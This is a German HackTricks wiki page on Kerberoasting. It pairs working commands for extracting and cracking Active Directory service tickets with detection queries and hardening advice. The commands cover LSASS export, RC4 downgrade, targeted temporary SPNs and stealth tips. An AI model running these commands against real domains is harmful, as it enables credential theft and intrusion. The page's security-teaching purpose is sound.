# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting konzentriert sich auf das Abrufen von TGS-Tickets, insbesondere solcher für Dienste, die in Active Directory (AD) unter Benutzerkonten ausgeführt werden, nicht jedoch unter Computerkonten. Für die Verschlüsselung dieser Tickets werden Schlüssel verwendet, die sich von Benutzerpasswörtern ableiten. Dadurch ist ein Offline-Cracking der Zugangsdaten möglich. Ein Dienst, der unter einem Benutzerkonto ausgeführt wird, ist an einer nicht leeren ServicePrincipalName (SPN)-Eigenschaft zu erkennen.

Jeder authentifizierte Domänenbenutzer kann TGS-Tickets anfordern. Dafür sind also keine besonderen Berechtigungen erforderlich.<sup>[[4]](#references)[[5]](#references)</sup>

### Wichtige Punkte

- Ziel sind TGS-Tickets für Dienste, die unter Benutzerkonten ausgeführt werden (d. h. Konten mit gesetztem SPN, keine Computerkonten).
- Die Tickets werden mit einem vom Passwort des Dienstkontos abgeleiteten Schlüssel verschlüsselt und können offline geknackt werden.
- Es sind keine erhöhten Berechtigungen erforderlich; jedes authentifizierte Konto kann TGS-Tickets anfordern.

> [!WARNING]
> Die meisten öffentlichen Tools fordern bevorzugt RC4-HMAC-Service-Tickets (etype 23) an, da sie schneller zu knacken sind als AES-Tickets. RC4-TGS-Hashes beginnen mit `$krb5tgs$23$*`, AES128-Hashes mit `$krb5tgs$17$*` und AES256-Hashes mit `$krb5tgs$18$*`. Viele Umgebungen stellen jedoch auf ausschließlich AES um. Gehe nicht davon aus, dass nur RC4 relevant ist.
> Vermeide außerdem „spray-and-pray“-Roasting. Rubeus’ standardmäßiger Kerberoast kann alle SPNs abfragen und Tickets dafür anfordern, was viel Aufsehen erregt. Ermittle zuerst interessante Principals und ziele gezielt auf sie ab.

### Geheimnisse von Dienstkonten und Kosten der Kerberos-Kryptografie

Viele Dienste werden nach wie vor unter Benutzerkonten mit manuell verwalteten Passwörtern ausgeführt. Der KDC verschlüsselt Service-Tickets mit Schlüsseln, die aus diesen Passwörtern abgeleitet werden, und übergibt den Chiffretext an jeden authentifizierten Principal. Kerberoasting ermöglicht daher unbegrenzt viele Offline-Versuche, ohne Kontosperrungen oder Telemetrie auf dem DC auszulösen. Der Verschlüsselungsmodus bestimmt den Aufwand für das Cracking:

| Modus | Schlüsselableitung | Verschlüsselungstyp | Ungefähre RTX-5090-Leistung* | Hinweise |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 mit 4.096 Iterationen und einem pro Principal generierten Salt aus Domäne + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 Millionen Versuche/s | Das Salt verhindert Rainbow Tables, ermöglicht aber weiterhin schnelles Cracking kurzer Passwörter. |
| RC4 + NT-Hash | Ein einzelner MD4-Hash des Passworts (ungesalzener NT-Hash); Kerberos fügt pro Ticket lediglich einen 8-Byte-Confounder hinzu | etype 23 (`$krb5tgs$23$`) | ~4.18 **Milliarden** Versuche/s | ~1000× schneller als AES; Angreifer erzwingen RC4, sofern `msDS-SupportedEncryptionTypes` dies zulässt. |

*Benchmarks von Chick3nman, zitiert in [Matthew Greens Analyse zu Kerberoasting](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Der Confounder von RC4 randomisiert lediglich den Keystream; er erhöht nicht den Aufwand pro Versuch. Wenn Dienstkonten keine zufälligen Geheimnisse verwenden (gMSA/dMSA, Computerkonten oder durch einen Vault verwaltete Zeichenfolgen), hängt die Geschwindigkeit des Kompromittierens ausschließlich von der GPU-Leistung ab. Die Erzwingung von ausschließlich AES-Verschlüsselungstypen beseitigt die Herabstufung auf Milliarden Versuche pro Sekunde, aber schwache menschliche Passwörter lassen sich weiterhin mit PBKDF2 knacken.<sup>[[3]](#references)</sup>

### Angriff

#### Linux

Ein praxisnahes End-to-End-Beispiel für das Anfordern knackbarer Tickets mit NetExec und deren Cracking mit Hashcat ist in Referenz [1] verfügbar.<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Tools mit mehreren Funktionen, einschließlich Kerberoast-Prüfungen:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Kerberoastable-Benutzer auflisten

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technik 1: TGS anfordern und aus dem Speicher dumpen

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technik 2: Automatische Tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Eine TGS-Anfrage erzeugt das Windows-Sicherheitsereignis 4769 (Ein Kerberos-Service-Ticket wurde angefordert).

### OPSEC und Umgebungen, die nur AES verwenden

- RC4 gezielt für Konten ohne AES anfordern:
  - Rubeus: `/rc4opsec` verwendet tgtdeleg, um Konten ohne AES aufzulisten, und fordert RC4-Service-Tickets an.
  - Rubeus: `/tgtdeleg` mit kerberoast löst nach Möglichkeit ebenfalls RC4-Anfragen aus.<sup>[[6]](#references)</sup>
- AES-only-Konten roast(en), statt stillschweigend abzubrechen:
  - Rubeus: `/aes` listet Konten mit aktiviertem AES auf und fordert AES-Service-Tickets an (etype 17/18).
  - Wenn du bereits ein TGT hast (PTT oder aus einer .kirbi-Datei), kannst du `/ticket:<blob|path>` mit `/spn:<SPN>` oder `/spns:<file>` verwenden und LDAP überspringen.
- Zielauswahl, Drosselung und weniger Auffälligkeit:
  - Verwende `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` und `/jitter:<1-100>`.
  - Filtere mit `/pwdsetbefore:<MM-dd-yyyy>` nach wahrscheinlich schwachen Passwörtern (ältere Passwörter) oder ziele mit `/ou:<DN>` auf privilegierte OUs ab.<sup>[[8]](#references)</sup>

Beispiele (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Persistenz / Missbrauch

Wenn du ein Konto kontrollierst oder ändern kannst, kannst du es durch Hinzufügen eines SPN kerberoastable machen:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Ein Konto downgraden, um RC4 für leichteres Cracking zu aktivieren (erfordert Schreibberechtigungen für das Zielobjekt):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Gezieltes Kerberoast via GenericWrite/GenericAll für einen Benutzer (temporärer SPN)

Wenn BloodHound zeigt, dass du die Kontrolle über ein Benutzerobjekt hast (z. B. GenericWrite/GenericAll), kannst du diesen bestimmten Benutzer zuverlässig „targeted-roasten“, selbst wenn er aktuell keine SPNs hat:<sup>[[9]](#references)</sup>

- Füge dem kontrollierten Benutzer einen temporären SPN hinzu, damit er roastbar wird.
- Fordere für diesen SPN einen mit RC4 (etype 23) verschlüsselten TGS-REP an, um das Cracken zu begünstigen.
- Cracker den `$krb5tgs$23$...`-Hash mit hashcat.
- Entferne den SPN anschließend, um den Footprint zu reduzieren.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux-Einzeiler (targetedKerberoast.py automatisiert: SPN hinzufügen -> TGS anfordern (etype 23) -> SPN entfernen):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Cracke die Ausgabe mit hashcat autodetect (mode 13100 für `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Detection-Hinweise: Das Hinzufügen/Entfernen von SPNs verursacht Änderungen im Verzeichnis (Event ID 5136/4738 beim Zielbenutzer), und die TGS-Anfrage erzeugt Event ID 4769. Ziehe eine Drosselung und eine zeitnahe Bereinigung in Betracht.

Nützliche Tools für Kerberoast-Angriffe findest du hier: https://github.com/nidem/kerberoast

Wenn unter Linux dieser Fehler auftritt: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, liegt das an einer Abweichung der lokalen Uhrzeit. Synchronisiere die Uhrzeit mit dem DC:

- `ntpdate <DC_IP>` (auf einigen Distributionen veraltet)
- `rdate -n <DC_IP>`

### Kerberoast ohne Domänenkonto (AS-requested STs)

Im September 2022 zeigte Charlie Clark, dass sich für einen Principal, der keine Pre-Authentifizierung erfordert, über eine präparierte KRB_AS_REQ ein Service-Ticket erhalten lässt, indem der sname im Request-Body geändert wird. Dadurch erhält man effektiv ein Service-Ticket statt eines TGT. Dies ähnelt AS-REP roasting und erfordert keine gültigen Domänen-Anmeldedaten.

Details: Semperis-Write-up „New Attack Paths: AS-requested STs“.<sup>[[10]](#references)</sup>

> [!WARNING]
> Du musst eine Liste von Benutzern angeben, da du ohne gültige Anmeldedaten mit dieser Technik keine LDAP-Abfragen ausführen kannst.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Verwandte Inhalte

Wenn du AS-REP roastable Benutzer ins Visier nimmst, siehe auch:

{{#ref}}
asreproast.md
{{#endref}}

### Erkennung

Kerberoasting kann unauffällig sein. Suche auf DCs nach Event ID 4769 und wende Filter an, um Rauschen zu reduzieren:

- Schließe den Dienstnamen `krbtgt` und Dienstnamen, die mit `$` enden (Computerkonten), aus.
- Schließe Anfragen von Computerkonten (`*$$@*`) aus.
- Nur erfolgreiche Anfragen (Failure Code `0x0`).
- Verfolge Verschlüsselungstypen: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Löse nicht nur bei `0x17` einen Alarm aus.

Beispiel für PowerShell-Triage:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Zusätzliche Ideen:

- Erfassen Sie die normale SPN-Nutzung pro Host/Benutzer als Baseline; lösen Sie einen Alarm aus, wenn ein einzelner Principal in kurzer Zeit viele unterschiedliche SPNs anfordert.
- Kennzeichnen Sie ungewöhnliche RC4-Nutzung in AES-gehärteten Domains.

### Mitigation / Hardening

- Verwenden Sie gMSA/dMSA- oder Computerkonten für Dienste. Verwaltete Konten haben zufällige Passwörter mit mindestens 120 Zeichen, die automatisch rotiert werden, wodurch Offline-Cracking praktisch unmöglich wird.<sup>[[7]](#references)</sup>
- Erzwingen Sie AES für Dienstkonten, indem Sie `msDS-SupportedEncryptionTypes` auf AES-only setzen (Dezimal 24 / Hex 0x18), und rotieren Sie anschließend das Passwort, damit AES-Schlüssel abgeleitet werden.<sup>[[7]](#references)</sup>
- Deaktivieren Sie RC4 nach Möglichkeit in Ihrer Umgebung und überwachen Sie versuchte RC4-Nutzung. Auf DCs können Sie den Registrierungswert `DefaultDomainSupportedEncTypes` verwenden, um Standardwerte für Konten festzulegen, für die `msDS-SupportedEncryptionTypes` nicht gesetzt ist. Testen Sie gründlich.
- Entfernen Sie unnötige SPNs aus Benutzerkonten.<sup>[[7]](#references)</sup>
- Verwenden Sie lange, zufällige Passwörter für Dienstkonten (mindestens 25 Zeichen), wenn verwaltete Konten nicht infrage kommen; sperren Sie gängige Passwörter und führen Sie regelmäßig Audits durch.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec-LDAP-Kerberoast und Hashcat-Cracking in der Praxis](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Angriffe mit geringer technischer Komplexität und großer Wirkung durch veraltete Kerberos-Kryptografie (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Wie greift man Kerberos an?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Missbrauch von Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Anfordern von RC4-verschlüsselten TGS bei aktiviertem AES](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsofts Empfehlungen zur Eindämmung von Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentation des Rubeus-kerberoast-Befehls](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL-Zugangsdaten → Targeted Kerberoast → Unconstrained Delegation → DCSync zu DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Neue Angriffspfade? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
